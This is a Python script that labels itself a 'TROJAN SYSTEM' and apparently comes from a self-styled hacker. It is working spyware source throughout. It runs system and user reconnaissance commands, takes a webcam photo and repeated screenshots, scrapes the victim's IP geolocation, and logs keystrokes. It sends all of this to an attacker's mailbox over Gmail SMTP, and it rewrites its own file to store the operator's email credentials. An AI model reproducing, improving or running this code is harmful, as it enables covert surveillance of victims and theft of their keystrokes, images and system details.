import subprocess
import time
import os
import io
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
import requests
from bs4 import BeautifulSoup
from email.mime.text import MIMEText
import smtplib
import cv2
from PIL import Image, ImageGrab
from pynput.keyboard import Listener
from colorama import Fore, Style, init


# A code by gray hacker .
# don't steal my code please .
# First public Code from me .
# github = https://www.github.com/Black_Node


init(autoreset=True)

def Welcome():
    scene = [
        Fore.RED + "        ┌──────────────────────────┐",
        Fore.RED + "        │      TROJAN SYSTEM       │",
        Fore.RED + "        └──────────────────────────┘",
        Fore.WHITE + "                (╯°□°）╯︵ ┻━┻         ",
        Fore.YELLOW + "               [ HACKER AT WORK ]   ",
        Fore.CYAN + "            ┌───────────────────┐   ",
        Fore.CYAN + "            │   ______________   │   ",
        Fore.GREEN + "            │  |             |  │   ",
        Fore.GREEN + "            │  |   ANONYMOUS  |  │   ",
        Fore.GREEN + "            │  |   MASK ON!   |  │   ",
        Fore.GREEN + "            │  |_____________|  │   ",
        Fore.CYAN + "            └───────────────────┘   ",
        Fore.WHITE + "                [ KEYBOARD ]         ",
        Fore.MAGENTA + "            (¬‿¬) Connected...       ",
    ]

    for line in scene:
        print(line)


Welcome()

time.sleep(6)

sender = ''
passwords = ''
receiver = ''

def credentials():
    global sender, passwords, receiver

    if sender and passwords and receiver:
        print("Credentials Set IN Script Successfully.")
        return sender, passwords, receiver

    sender = input("Enter Sender Email: ")
    print(f"Email sender Set {sender}")
    passwords = input("Enter APP Password: ")
    print(f"Email sender Password Set {passwords}")
    receiver = input("Enter Receiver Email: ")
    print(f"Email Receiver Set {receiver}")

    script_path = __file__

    with open(script_path, 'r',encoding="utf-8") as f:
        script_content = f.read()

    script_content = script_content.replace("sender = ''", "")
    script_content = script_content.replace("passwords = ''", "")
    script_content = script_content.replace("receiver = ''", "")

    script_content = script_content.replace("sender = '1234'", f"sender = '{sender}'")
    script_content = script_content.replace("passwords = '122'", f"passwords = '{passwords}'")
    script_content = script_content.replace("receiver = '1111'", f"receiver = '{receiver}'")

    new_lines = f"\nsender = '{sender}'\npasswords = '{passwords}'\nreceiver = '{receiver}'\n"
    script_content = new_lines + script_content

    with open(script_path, 'w',encoding="utf-8") as f:
        f.write(script_content)

    print("Credentials successfully set in the script.")
    return sender, passwords, receiver

if __name__ == "__main__":
    sender, passwords, receiver = credentials()
    print(f"Sender: {sender}\nReceiver: {receiver}")



def Hard_ware():
    sender, password, receiver = credentials()
    commands = ["dir",
                "net user",
                "ipconfig /all",
                "netstat /a",
                "wmic cpu get name,caption,deviceid",
                "tasklist",
                "wmic cpu get name",
                "wmic path win32_videocontroller get caption",
                "wmic memorychip get capacity",
                ]
    out_put = ''
    for i in commands:
        try:
            result = subprocess.run(i, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out_put += f"\n\n Command: {i}\n{result.stdout}"
        except Exception as e:
            print(f"failed to execute commands {i} {e}")

    server = smtplib.SMTP("smtp.gmail.com",port=587)
    server.starttls()
    server.login(sender,password)

    msg = MIMEMultipart()
    msg['from'] = sender
    msg['to'] = receiver
    msg['subject'] = "subject hardware and other informations ."

    body = MIMEText(out_put,"plain")
    msg.attach(body)

    server.sendmail(sender,receiver,msg.as_string())

    server.quit()


def capture_camera():
    sender, passwords, receiver = credentials()
    cap = cv2.VideoCapture(0)
    r, f = cap.read()
    cap.release()
    if not r:
        print("Failed to Capture.")
        return
    img = Image.fromarray(cv2.cvtColor(f, cv2.COLOR_BGR2RGB))
    im = io.BytesIO()
    img.save(im, format="JPEG")
    im.seek(0)
    msg = MIMEMultipart()
    msg["from"] = sender
    msg["to"] = receiver
    msg["subject"] = "Captured Camera."
    part = MIMEBase("application", "octet-stream")
    part.set_payload(im.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment; filename=captured_image.jpg")
    msg.attach(part)
    try:
        server = smtplib.SMTP("smtp.gmail.com", port=587)
        server.starttls()
        server.login(sender, passwords)
        server.sendmail(sender, receiver, msg.as_string())
    except ConnectionError:
        print("Failed To send Email.")


def screen_shot():
    sender, password, receiver = credentials()

    for i in range(13):
        screen = ImageGrab.grab()
        bytes_io = io.BytesIO()
        screen.save(bytes_io, format="PNG")
        bytes_io.seek(0)

        msg = MIMEMultipart()
        msg["from"] = sender
        msg["to"] = receiver
        msg["subject"] = f"New Screenshot Captured ({i+1})."

        # Attach screenshot to email
        attachment = MIMEBase("application", "octet-stream")
        attachment.set_payload(bytes_io.getvalue())
        encoders.encode_base64(attachment)
        attachment.add_header("Content-Disposition", f"attachment; filename=screenshot_{int(time.time())}.png")
        msg.attach(attachment)

        with smtplib.SMTP("smtp.gmail.com", port=587) as server:
            server.starttls()
            server.login(sender, password)
            server.send_message(msg)

        print(f"Screenshot {i+1} sent.")

        time.sleep(10)


def location():
    sender,password,receiver = credentials()

    url = "https://mylocation.org/"

    response = requests.get(url)
    if response.status_code == 200:
        print("Successfully Found the page .")
    else:
        print("Failed to Found the page")

    soup = BeautifulSoup(response.text,"html.parser")
    address = soup.find('td',text="IP Address").find_next_sibling('td').text.strip()
    latitude = soup.find('td', text='Latitude').find_next_sibling('td').text.strip()
    longitude = soup.find('td', text='Longitude').find_next_sibling('td').text.strip()
    country = soup.find('td', text='Country').find_next_sibling('td').text.strip()
    region = soup.find('td', text='Region').find_next_sibling('td').text.strip()
    city = soup.find('td', text='City').find_next_sibling('td').text.strip()
    organization = soup.find('td', text='Organization').find_next_sibling('td').text.strip()

    info = str([address,latitude,longitude,country,
            region,city,organization])


    msg = MIMEText(info)
    msg["from"] = sender
    msg["to"] = receiver
    msg["subject"] = "Target actually location ."


    server = smtplib.SMTP("smtp.gmail.com",port=587)
    server.starttls()
    server.login(sender,password)
    server.sendmail(sender,receiver,msg.as_string())
    server.quit()



def keylogger():
    while True:
        folders = "C:\\Temp"
        os.makedirs(folders, exist_ok=True)
        time.sleep(1)

        path = os.path.join(folders, "test.txt")
        with open(path, "w") as f:
            f.write("Key logging started .. \n")

        def on_press(key):
            with open(path, "a") as b:
                try:
                    if key == "enter":
                        b.write("\n")
                    else:
                        b.write(f"{key.char}")
                except AttributeError:
                    b.write(f"{str(key)}")

        with Listener(on_press) as listener:
            listener.join(timeout=60)

        send_file(path)

def send_file(path):
    sender, password, receiver = credentials()
    if not os.path.exists(path):
        print("file does not exist.")
        return
    msg = MIMEMultipart()
    msg["from"] = sender
    msg["to"] = receiver
    msg["subject"] = "Key logging file is here."

    attachment = MIMEBase("application", "octet-stream")
    with open(path, "rb") as file:
        attachment.set_payload(file.read())
        encoders.encode_base64(attachment)
        attachment.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(path)}")
    msg.attach(attachment)

    server = smtplib.SMTP("smtp.gmail.com", port=587)
    server.starttls()
    server.login(sender, password)
    server.send_message(msg)

    server.quit()

    time.sleep(60)


def run_anything():
    Hard_ware()
    capture_camera()
    screen_shot()
    location()
    keylogger()


run_anything()
